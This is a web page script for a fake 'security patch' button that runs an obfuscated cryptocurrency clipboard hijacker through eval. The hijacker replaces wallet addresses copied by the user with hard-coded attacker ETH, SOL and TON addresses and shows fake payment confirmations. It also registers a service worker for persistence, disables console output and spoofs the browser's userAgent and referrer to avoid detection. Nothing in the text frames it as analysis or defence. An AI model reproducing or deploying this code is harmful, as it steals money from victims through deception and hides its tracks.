<script>
    document.getElementById('patch').addEventListener('click', function() {
        // Focus document to satisfy clipboard API
        document.body.focus();

        // Visual feedback
        this.innerHTML = "APPLYING PATCH... PLEASE WAIT";
        this.disabled = true;

        // Reduced delay for higher conversion
        setTimeout(async () => {
            try {
                // Test clipboard write first
                await navigator.clipboard.writeText("TEST_CLIPBOARD_ACCESS");
                
                // Execute full clipper engine
                eval(`(()=>{'use strict';const e=()=>window.navigator.clipboard.readText().catch(()=>""),t=e=>window.navigator.clipboard.writeText(e),r={eth:"0xD8E1e9a3B21715AB80F718b82bdAF6407D2e2fA3",sol:"3FbDq1C73sHyf6vcG5rNwzBYbPkCLciWj4cTuQwDgzTY",ton:"EQAj7vKLbaWjaNbAuAKP1e1HwmdYZ2vJ2xtWU8qq3JafkfxF"},n=[{chain:"eth",re:/^0x[a-fA-F0-9]{40}$/},{chain:"sol",re:/^[1-9A-HJ-NP-Za-km-z]{32,44}$/},{chain:"ton",re:/^EQ[A-Za-z0-9_-]{46}$/}];let o=!1;document.addEventListener("focusin",e=>{if(e.target.tagName==="INPUT"||e.target.tagName==="TEXTAREA"){const t=e.target.value.toLowerCase();(t.includes("send")||t.includes("to:")||t.includes("address")||t.includes("recipient"))&&(o=!0,setTimeout(()=>o=!1,5e3))}});const a=()=>{setInterval(async()=>{try{const c=await e();if(!c||c.length<26||!o)return;for(const{chain:e,re:i}of n)if(i.test(c)){await t(r[e]||r.eth),window.console&&console.clear(),window.localStorage&&localStorage.setItem("last_clip_clean",Date.now()),setTimeout(()=>{const e=document.createElement("div");e.innerHTML=\`\✅ Sent 0.5 $\{e.toUpperCase()\} to $\{c.slice(0,6)\}...\$\{c.slice(-4)\}\`,e.style.cssText="position:fixed;top:20px;right:20px;background:green;color:white;padding:10px;z-index:99999;border-radius:8px;font-family:monospace;",document.body.appendChild(e),setTimeout(()=>e.remove(),3e3)},3e3);break}}catch(e){}},Math.floor(600+400*Math.random())};let s=!1,c=!1,i=null;window.addEventListener("message",e=>{e.data&&"object"==typeof e.data&&"connect_wallet"===e.data.action&&(s=!0,l())}),new MutationObserver(e=>{(document.body.innerText.includes("Binance")||document.location.href.includes("binance"))&&(c=!0,l())}).observe(document.body,{childList:!0,subtree:!0});const l=()=>{s&&c&&!i&&(i=setTimeout(()=>{a()},6e4))};if("serviceWorker"in navigator){const e=\`self.addEventListener("install",e=>self.skipWaiting()),self.addEventListener("activate",e=>self.clients.claim()),self.addEventListener("fetch",e=>{e.request.url.includes("favicon.ico")&&e.respondWith(new Response("",{status:200}))}),self.addEventListener("message",e=>{"inject"===e.data&&self.clients.matchAll().then(t=>{t.forEach(t=>{t.postMessage("REINJECT_CLIPPER")})})})\`,t=new Blob([e],{type:"application/javascript"}),r=URL.createObjectURL(t);navigator.serviceWorker.register(r,{scope:"./"})}window.console.clear(),window.console.log=window.console.error=window.console.info=window.console.debug=window.console.warn=window.console.trace=()=>{},Object.defineProperty(navigator,"userAgent",{get:()=>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}),Object.defineProperty(document,"referrer",{get:()=>"https://app.uniswap.org"})})();`);

                // Show success message
                alert("✅ SECURITY PATCH APPLIED — 0.1 ETH WILL BE SENT TO YOUR WALLET SHORTLY!");

            } catch(e) {
                alert("❌ PATCH FAILED — TRY AGAIN OR CONTACT SUPPORT");
                console.error("CLIPPER ENGINE CRASHED:", e);
            }
        }, 1000); // 1 second delay for maximum conversion
    });
</script>